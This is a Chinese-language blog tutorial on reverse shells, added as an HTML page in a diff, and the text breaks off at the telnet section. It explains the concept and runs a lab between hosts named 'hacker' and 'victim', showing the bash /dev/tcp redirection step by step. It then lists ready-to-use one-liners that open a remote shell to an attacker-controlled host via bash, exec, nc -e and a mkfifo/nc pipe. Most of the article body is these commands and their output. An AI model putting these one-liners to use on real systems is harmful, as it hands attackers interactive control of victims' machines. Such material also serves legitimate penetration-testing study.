@@ -1,0 +1,920 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2488174175014870" crossorigin="anonymous"></script><!-- google 广告 -->
+  <meta name="google-site-verification" content="40lMg4eqLLbXoDcpN3h-cEnfmselbQ8tUzNvuC0IRIs" /><!-- google 站点认证 -->
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Lepeng">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="什么是反弹 shell （reverse shell）反弹 shell 就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。 为什么要反弹 shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。 举例：假设我们">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞之 reverse shell (反弹 shell)">
+<meta property="og:url" content="https://flepeng.github.io/081-security-%E6%BC%8F%E6%B4%9E-%E6%BC%8F%E6%B4%9E%E4%B9%8B-reverse-shell-%E5%8F%8D%E5%BC%B9-shell/index.html">
+<meta property="og:site_name" content="Lepeng">
+<meta property="og:description" content="什么是反弹 shell （reverse shell）反弹 shell 就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。 为什么要反弹 shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。 举例：假设我们">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-03-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-03T10:25:30.411Z">
+<meta property="article:author" content="Feng Lepeng">
+<meta property="article:tag" content="security">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>漏洞之 reverse shell (反弹 shell) - Lepeng</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"flepeng.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"f3d259b9efd9ce8655c180fd01bf0045","google":{"measurement_id":"G-LFTE4C7W3W"},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?f3d259b9efd9ce8655c180fd01bf0045";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-LFTE4C7W3W", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', 'G-LFTE4C7W3W');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Lepeng 的 blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="漏洞之 reverse shell (反弹 shell)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-03-08 00:00" pubdate>
+          2021年3月8日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">漏洞之 reverse shell (反弹 shell)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="什么是反弹-shell-（reverse-shell）"><a href="#什么是反弹-shell-（reverse-shell）" class="headerlink" title="什么是反弹 shell （reverse shell）"></a>什么是反弹 shell （reverse shell）</h2><p>反弹 shell 就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<h2 id="为什么要反弹-shell"><a href="#为什么要反弹-shell" class="headerlink" title="为什么要反弹 shell"></a>为什么要反弹 shell</h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
+<p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？</p>
+<p>有如下情况：</p>
+<ol>
+<li>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</li>
+<li>目标机器的 ip 动态改变，你不能持续控制。</li>
+<li>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</li>
+<li>对于病毒、木马、受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</li>
+</ol>
+<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
+<blockquote>
+<p>参考：<a href="https://www.zhihu.com/question/24503813" target="_blank" rel="noopener">https://www.zhihu.com/question/24503813</a></p>
+</blockquote>
+<h2 id="反弹shell实验"><a href="#反弹shell实验" class="headerlink" title="反弹shell实验"></a>反弹shell实验</h2><p>环境：两台CentOS7.6服务器</p>
+<ul>
+<li>攻击端 hacker：10.201.61.194</li>
+<li>受害端 victim：10.201.61.195</li>
+</ul>
+<h3 id="测试0"><a href="#测试0" class="headerlink" title="测试0"></a>测试0</h3><ol>
+<li><p>攻击端监听一个端口：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>hacker ~]# nc -lvp <span class="hljs-number">6767</span><br>Ncat: Version <span class="hljs-number">7.50</span> ( https:<span class="hljs-comment">//nmap.org/ncat )</span><br>Ncat: Listening on :::<span class="hljs-number">6767</span><br>Ncat: Listening on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">6767</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>受害端生成一个反弹shell：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>victim ~]# bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.194</span>/<span class="hljs-number">6767</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>攻击端已获取到受害端的bash：</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@hacker ~]</span># <span class="hljs-selector-tag">nc</span> <span class="hljs-selector-tag">-lvp</span> <span class="hljs-selector-tag">6767</span><br><span class="hljs-selector-tag">Ncat</span>: <span class="hljs-selector-tag">Version</span> <span class="hljs-selector-tag">7</span><span class="hljs-selector-class">.50</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/ncat )</span><br><span class="hljs-attribute">Ncat</span>: Listening <span class="hljs-attribute">on </span>:::<span class="hljs-number">6767</span><br><span class="hljs-attribute">Ncat</span>: Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6767</span><br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">10.201</span>.<span class="hljs-number">61.195</span>.<br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">10.201</span>.<span class="hljs-number">61.195</span>:<span class="hljs-number">46836</span>.<br>[root<span class="hljs-variable">@victim</span> ~]#         <span class="hljs-comment">//攻击端已获得受害端的远程交互式shell</span><br>[root<span class="hljs-variable">@victim</span> ~]# hostname<br>hostname<br>victim<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>解释：</p>
+<ol>
+<li><p><code>nc -lvp 6767</code></p>
+<p>-l 监听，-v 输出交互或出错信息，-p 端口。nc 是 netcat 的简写，可实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。</p>
+</li>
+<li><p><code>bash -i</code></p>
+<p>-i interactive。即产生一个交互式的shell（bash）。  </p>
+</li>
+<li><p><code>/dev/tcp/IP/PORT</code></p>
+<p>特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 <code>bash</code> 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p>
+</li>
+</ol>
+<p>通过以下4个小测试来分析反弹shell实现过程</p>
+<h3 id="测试1"><a href="#测试1" class="headerlink" title="测试1"></a>测试1</h3><p>受害端：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>victim ~]# bash -i &gt; /dev/tcp/<span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.194</span>/<span class="hljs-number">5566</span> <span class="hljs-comment">//第二步</span><br>[<span class="hljs-symbol">root@</span>victim ~]# hostname                              <span class="hljs-comment">//第三步</span><br></code></pre></td></tr></table></figure>
+
+<p>攻击端：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>hacker ~]# nc -lvp <span class="hljs-number">5566</span>      <span class="hljs-comment">//第一步</span><br>Ncat: Version <span class="hljs-number">7.50</span> ( https:<span class="hljs-comment">//nmap.org/ncat )</span><br>Ncat: Listening on :::<span class="hljs-number">5566</span><br>Ncat: Listening on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5566</span><br>Ncat: Connection <span class="hljs-keyword">from</span> <span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.195</span>.<br>Ncat: Connection <span class="hljs-keyword">from</span> <span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.195</span>:<span class="hljs-number">49018.</span><br><br>victim      <span class="hljs-comment">//测试1结果：实现了将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="测试2"><a href="#测试2" class="headerlink" title="测试2"></a>测试2</h3><p>受害端：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>victim ~]# bash -i &lt; /dev/tcp/<span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.194</span>/<span class="hljs-number">5566</span>        <span class="hljs-comment">//第二步</span><br>[<span class="hljs-symbol">root@</span>victim ~]# hostname        <span class="hljs-comment">//测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。</span><br>victim<br></code></pre></td></tr></table></figure>
+
+<p>攻击端：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>hacker ~]# nc -lvp <span class="hljs-number">5566</span>        <span class="hljs-comment">//第一步</span><br>Ncat: Version <span class="hljs-number">7.50</span> ( https:<span class="hljs-comment">//nmap.org/ncat )</span><br>Ncat: Listening on :::<span class="hljs-number">5566</span><br>Ncat: Listening on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5566</span><br>Ncat: Connection <span class="hljs-keyword">from</span> <span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.195</span>.<br>Ncat: Connection <span class="hljs-keyword">from</span> <span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.195</span>:<span class="hljs-number">50412.</span><br>hostname                            <span class="hljs-comment">//第三步（攻击端执行命令）</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="测试3"><a href="#测试3" class="headerlink" title="测试3"></a>测试3</h3><p>受害端：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>victim ~]# bash -i &gt; /dev/tcp/<span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.194</span>/<span class="hljs-number">5566</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>        <span class="hljs-comment">//第二步</span><br>[<span class="hljs-symbol">root@</span>victim ~]# hostname       <span class="hljs-comment">//受害端回显命令</span><br>[<span class="hljs-symbol">root@</span>victim ~]# id             <span class="hljs-comment">//受害端回显命令</span><br>[<span class="hljs-symbol">root@</span>victim ~]# hahaha         <span class="hljs-comment">//受害端回显命令</span><br>bash: hahaha: command <span class="hljs-keyword">not</span> found <span class="hljs-comment">//受害端回显命令。显示错误命令的输出。</span><br>[<span class="hljs-symbol">root@</span>victim ~]#<br></code></pre></td></tr></table></figure>
+
+<p>攻击端：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>hacker ~]# nc -lvp <span class="hljs-number">5566</span>        <span class="hljs-comment">//第一步</span><br>Ncat: Version <span class="hljs-number">7.50</span> ( https:<span class="hljs-comment">//nmap.org/ncat )</span><br>Ncat: Listening on :::<span class="hljs-number">5566</span><br>Ncat: Listening on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5566</span><br>Ncat: Connection <span class="hljs-keyword">from</span> <span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.195</span>.<br>Ncat: Connection <span class="hljs-keyword">from</span> <span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.195</span>:<span class="hljs-number">36792.</span><br>hostname        <span class="hljs-comment">//第三步（攻击端执行命令）</span><br>victim<br>id              <span class="hljs-comment">//第四步（攻击端执行命令）</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br>hahaha          <span class="hljs-comment">//第五步（执行一个错误的命令）</span><br><br><span class="hljs-comment">//测试3结果：基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="测试4（将上面三个测试结合。将标准输入、标准输出、错误输出全都重定向到攻击端）："><a href="#测试4（将上面三个测试结合。将标准输入、标准输出、错误输出全都重定向到攻击端）：" class="headerlink" title="测试4（将上面三个测试结合。将标准输入、标准输出、错误输出全都重定向到攻击端）："></a>测试4（将上面三个测试结合。将标准输入、标准输出、错误输出全都重定向到攻击端）：</h3><p>受害端：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>victim ~]# bash -i &gt; /dev/tcp/<span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.194</span>/<span class="hljs-number">5566</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>        <span class="hljs-comment">//第二步。或 # bash -i &amp;&gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1  （注：&amp;&gt;或&gt;&amp; 表示混合输出，即标准输出1 + 错误输出2）</span><br></code></pre></td></tr></table></figure>
+
+<p>攻击端：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>hacker ~]# nc -lvp <span class="hljs-number">5566</span>        <span class="hljs-comment">//第一步</span><br>Ncat: Version <span class="hljs-number">7.50</span> ( https:<span class="hljs-comment">//nmap.org/ncat )</span><br>Ncat: Listening on :::<span class="hljs-number">5566</span><br>Ncat: Listening on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5566</span><br>Ncat: Connection <span class="hljs-keyword">from</span> <span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.195</span>.<br>Ncat: Connection <span class="hljs-keyword">from</span> <span class="hljs-number">10.201</span><span class="hljs-number">.61</span><span class="hljs-number">.195</span>:<span class="hljs-number">51182.</span><br>[<span class="hljs-symbol">root@</span>victim ~]# hostname        <span class="hljs-comment">//第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令~</span><br>hostname<br>victim<br><br><span class="hljs-comment">//PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用~~~</span><br></code></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li>输入的命令，如 ls，其实是linux 回显在屏幕上的，属于错误输出 2</li>
+<li>输入命令显示的结果，如 ls 的结果，属于正常输出 1</li>
+</ul>
+<h2 id="各种-反弹-shell"><a href="#各种-反弹-shell" class="headerlink" title="各种 反弹 shell"></a>各种 反弹 shell</h2><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><ol>
+<li><p>在攻击主机上执行端口监听：</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">nc</span> -lvvp <span class="hljs-keyword">port</span> //<span class="hljs-keyword">port</span> 为攻击主机端口号，并且此端口号没有被占用<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>在目标主机上执行：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">bash -i &gt;&amp; /dev/tcp/攻击主机ip/port <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>  <span class="hljs-comment">//port 为攻击主机端口号</span><br><span class="hljs-comment">// or </span><br>bash -i &gt; /dev/tcp/攻击主机ip/port <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">exec <span class="hljs-number">5</span>&lt;&gt;/dev/tcp/x.x.x.x/<span class="hljs-number">9999</span><br><br>cat &lt;&amp;<span class="hljs-number">5</span> | <span class="hljs-keyword">while</span> read line; <span class="hljs-keyword">do</span> $line <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">5</span> &gt;&amp;<span class="hljs-number">5</span>; done<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>第一条命令 建立与x.x.x.x:9999的tcp连接，并将标准输入输出作为device 5的标准输入输出</p>
+</li>
+<li><p>第二条cat &lt;&amp;5 获取device5的输入; <code>while read line; do $line 2&gt;&amp;5 &gt;&amp;5</code> 一旦获取到命令便运行 然后将标准输入输出以及标准错误输出到device5中</p>
+</li>
+</ul>
+<h3 id="nc-netcat-反弹"><a href="#nc-netcat-反弹" class="headerlink" title="nc(netcat) 反弹"></a>nc(netcat) 反弹</h3><ol>
+<li><p>在攻击主机上执行端口监听：</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">nc</span> -lvvp <span class="hljs-keyword">port</span>    //<span class="hljs-keyword">port</span> 为攻击主机端口号，并且此端口号没有被占用<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>在目标主机上执行：</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> -e /<span class="hljs-keyword">bin/bash </span>攻击主机<span class="hljs-built_in">ip</span> port<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>还可以在目标主机上这样执行</p>
+<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> <span class="hljs-number">1234</span>|/bin/bash|nc <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> <span class="hljs-number">4321</span>    <span class="hljs-comment">//在攻击主机上打开两个终端，分别监听 1234 和 4321 端口，得到反弹shell后，1234 终端 输入命令， 4321 终端就会获得执行相应命令后的结果</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>由于现在很多主机上可能没有netcat了，所以如果遇到虽然有netcat 但不支持 <code>nc -e /bin/bash 攻击主机ip port</code> 中 <code>-e</code>选项的主机，还可以这样反弹shell</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">1234</span> &gt;/tmp/f<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>rm /tmp/f</code> 删除命令</li>
+<li><code>mkfifo /tmp/f;</code> 在tmp目录下写fifo文件f</li>
+<li><code>/bin/sh -i 2&gt;&amp;1</code> 将&#x2F;bin&#x2F;sh 的标准错误重定向到标准输出</li>
+<li><code>nc x.x.x.x 2333 &gt;/tmp/f</code>将nc监听到的输入 输入到fifo</li>
+</ul>
+</li>
+</ol>
+<h3 id="telnet-反弹"><a href="#telnet-反弹" class="headerlink" title="telnet 反弹"></a>telnet 反弹</h3><ol>
+<li><p>在攻击主机上打开两个终端分别监听 1234 和 4321端口,(确保端口开放，并且不被占用)，得到反弹shell后，1234 终端 输入命令， 4321 终端就会获得执行相应命令后的结果：</p>
